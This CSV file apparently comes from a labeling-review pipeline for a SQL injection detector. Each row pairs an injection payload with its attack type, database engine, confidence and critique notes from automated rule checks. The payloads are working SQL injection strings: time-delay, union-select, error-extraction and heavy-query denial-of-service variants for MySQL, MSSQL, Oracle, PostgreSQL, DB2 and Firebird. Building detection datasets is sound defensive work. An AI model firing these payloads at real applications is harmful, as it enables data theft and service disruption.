payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,payload_inner,wrapper_detected,strip_depth,a_type,a_db,a_signals,c_type,c_db,c_signals
"-5181"" ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ( ""qofp"" = ""qofp",boolean_blind,mysql,0.7,elt_boolean,RELABEL,reasoning too short (11 chars),boolean_blind,mysql,"-5181"" ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ( ""qofp"" = ""qofp",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check
"-2838"" where 5442 = 5442 union all select 5442#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-2838"" where 5442 = 5442 union all select 5442#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1"" ) as lexx where 2892 = 2892 or elt ( 6272 = 6272,sleep ( 5 ) ) --",time_blind,mysql,0.7,elt_sleep,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,"1"" ) as lexx where 2892 = 2892 or elt ( 6272 = 6272,sleep ( 5 ) ) --",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
"1"" ) where 6072 = 6072 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.9,benchmark,RELABEL,reasoning too short (9 chars),time_blind,mysql,"1"" ) where 6072 = 6072 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",False,0,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1' ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( 'tpcm' like 'tpcm",heavy_query,mssql,0.7,mssql_sysjoin,RELABEL,reasoning too short (13 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1' ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( 'tpcm' like 'tpcm",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"1' where 6905 = 6905 union all select null,null,null,null,null,null#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"1' where 6905 = 6905 union all select null,null,null,null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1' ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( 'iwkg' = 'iwkg",error_based,mysql,0.9,exp_extract,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1' ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( 'iwkg' = 'iwkg",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1"" and 4996 = 4431 and ""jzaq"" = ""jzaq",boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,"1"" and 4996 = 4431 and ""jzaq"" = ""jzaq",False,0,boolean_blind,generic,Pattern match: 'and 4996 = 4431' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
"1' ) where 7007 = 7007 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,0.9,dbms_pipe,RELABEL,reasoning too short (9 chars),time_blind,oracle,"1' ) where 7007 = 7007 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",False,0,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected
"1"" ) ) as czzg where 5483 = 5483 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",error_based,mysql,0.9,exp_extract,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1"" ) ) as czzg where 5483 = 5483 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1' ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( 'lgcw' = 'lgcw",error_based,mysql,0.9,exp_extract,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1' ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( 'lgcw' = 'lgcw",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1%' ) ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( '%' = '",error_based,mysql,0.9,extractvalue,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1%' ) ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( '%' = '",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1"" ) as cfed where 8220 = 8220 union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"1"" ) as cfed where 8220 = 8220 union all select null,null,null,null,null,null,null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
-8876' ) ) or 3038 = 3038,boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,-8876' ) ) or 3038 = 3038,False,0,boolean_blind,generic,Pattern match: 'or 3038 = 3038' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
"-1593' or elt ( 7044 = 6125,6125 ) and 'zkuz' = 'zkuz",boolean_blind,mysql,0.7,elt_boolean,RELABEL,reasoning too short (11 chars),boolean_blind,mysql,"-1593' or elt ( 7044 = 6125,6125 ) and 'zkuz' = 'zkuz",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check
"1' and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and 'dubu' like 'dubu",time_blind,oracle,0.9,dbms_pipe,RELABEL,reasoning too short (9 chars),time_blind,oracle,"1' and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and 'dubu' like 'dubu",False,0,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected
"1' ) where 6388 = 6388 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.7,db2_sysjoin,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,db2,"1' ) where 6388 = 6388 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",False,0,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal
"1' ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( 'lwyo' = 'lwyo",time_blind,postgresql,0.7,generate_series,RELABEL,reasoning too short (15 chars); rule-check disagrees: rule says 'heavy_query' (P4) but labeled 'time_blind' (P5),heavy_query,postgresql,"1' ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( 'lwyo' = 'lwyo",False,0,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload)
1 where 8532 = 8532,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,1 where 8532 = 8532,False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
"-8790' ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'nsze' like 'nsze",error_based,mssql,0.9,convert_char,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"-8790' ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'nsze' like 'nsze",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"-9023%"" ) ) ) union all select 4490,4490,4490#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-9023%"" ) ) ) union all select 4490,4490,4490#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1%"" and make_set ( 2905 = 5725,5725 ) and ""%"" = """,boolean_blind,mysql,0.7,make_set,RELABEL,reasoning too short (8 chars),boolean_blind,mysql,"1%"" and make_set ( 2905 = 5725,5725 ) and ""%"" = """,False,0,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
"1 ) ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( ( 3023 = 3023",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,"1 ) ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( ( 3023 = 3023",False,0,boolean_blind,mysql,generic SQL keywords without specific signal,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1"" or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ""xbft"" = ""xbft",time_blind,mysql,0.9,benchmark,RELABEL,reasoning too short (9 chars),time_blind,mysql,"1"" or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ""xbft"" = ""xbft",False,0,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1"" or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,"1"" or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload)
"-4615' ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ( 'jipk' like 'jipk",boolean_blind,mysql,0.7,elt_boolean,RELABEL,reasoning too short (11 chars),boolean_blind,mysql,"-4615' ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ( 'jipk' like 'jipk",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check
"1"" ) ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( ""uqyb"" = ""uqyb",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,"1"" ) ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( ""uqyb"" = ""uqyb",False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload)
"1 ) where 9724 = 9724 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,"1 ) where 9724 = 9724 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload)
"-2149"" ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ( ""hoon"" like ""hoon",boolean_blind,mysql,0.7,elt_boolean,RELABEL,reasoning too short (11 chars),boolean_blind,mysql,"-2149"" ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ( ""hoon"" like ""hoon",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check
"-4513"" ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( ""gytb"" = ""gytb",error_based,oracle,0.9,xmltype_error,RELABEL,reasoning too short (13 chars),error_based,oracle,"-4513"" ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( ""gytb"" = ""gytb",False,0,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal
"1 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) # tcrm",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,"1 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) # tcrm",False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload)
"1"" ) ) ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.7,db2_sysjoin,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,db2,"1"" ) ) ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",False,0,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal
waitfor delay '0:0:5' and ( 4614 = 4614,time_blind,mssql,0.9,waitfor,RELABEL,reasoning too short (7 chars),time_blind,mssql,waitfor delay '0:0:5' and ( 4614 = 4614,False,0,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected
"1' ) as bxae where 4143 = 4143 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",error_based,mysql,0.9,updatexml,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1' ) as bxae where 4143 = 4143 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1' and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and 'vmuj' like 'vmuj",time_blind,mysql,0.9,benchmark,RELABEL,reasoning too short (9 chars),time_blind,mysql,"1' and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and 'vmuj' like 'vmuj",False,0,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1' ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( 'zizo' like 'zizo",time_blind,mysql,0.7,elt_sleep,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,"1' ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( 'zizo' like 'zizo",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check
1 and sleep ( 5 ),time_blind,mysql,0.9,sleep_subquery,RELABEL,reasoning too short (14 chars),time_blind,mysql,1 and sleep ( 5 ),False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check
"-5595"" ) ) as xttj where 4562 = 4562 union all select 4562,4562,4562,4562,4562#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-5595"" ) ) as xttj where 4562 = 4562 union all select 4562,4562,4562,4562,4562#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1"" ) union all select null--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"1"" ) union all select null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
1' where 1692 = 1692,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,1' where 1692 = 1692,False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
"1 ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",time_blind,mysql,0.7,elt_sleep,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,"1 ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check
"1 ) where 5333 = 5333 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,oracle,0.7,oracle_sysjoin,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1 ) where 5333 = 5333 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( 'hmsu' = 'hmsu",time_blind,oracle,0.9,dbms_pipe,RELABEL,reasoning too short (9 chars),time_blind,oracle,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( 'hmsu' = 'hmsu",False,0,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected
1 ) ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ( 5333 = 5333,time_blind,postgresql,0.9,pg_sleep,RELABEL,reasoning too short (8 chars),time_blind,postgresql,1 ) ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ( 5333 = 5333,False,0,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal
"1, ( select ( case when ( 5141 = 5141 ) then ( ascii ( regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) ) else 5141/ ( select 0 from ( values ( 0 ) ) ) end ) from ( values ( 0 ) ) )",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,"1, ( select ( case when ( 5141 = 5141 ) then ( ascii ( regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) ) else 5141/ ( select 0 from ( values ( 0 ) ) ) end ) from ( values ( 0 ) ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload)
"1"" where 6686 = 6686 or elt ( 6272 = 6272,sleep ( 5 ) ) --",time_blind,mysql,0.7,elt_sleep,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,"1"" where 6686 = 6686 or elt ( 6272 = 6272,sleep ( 5 ) ) --",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
"1'|| ( select 'pnsw' where 2103 = 2103 union all select null,null,null,null,null,null,null,null--",union_based,oracle,0.7,oracle_union,RELABEL,reasoning too short (12 chars),union_based,oracle,"1'|| ( select 'pnsw' where 2103 = 2103 union all select null,null,null,null,null,null,null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1'+ ( select vvet where 5221 = 5221 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) ) +'",error_based,mysql,0.9,exp_extract,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1'+ ( select vvet where 5221 = 5221 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) ) +'",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) # jcdh",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,"1 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) # jcdh",False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload)
1' ) as gxfu where 9676 = 9676,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,1' ) as gxfu where 9676 = 9676,False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
"1' where 2025 = 2025 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.7,firebird_sysjoin,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,firebird,"1' where 2025 = 2025 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",False,0,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal
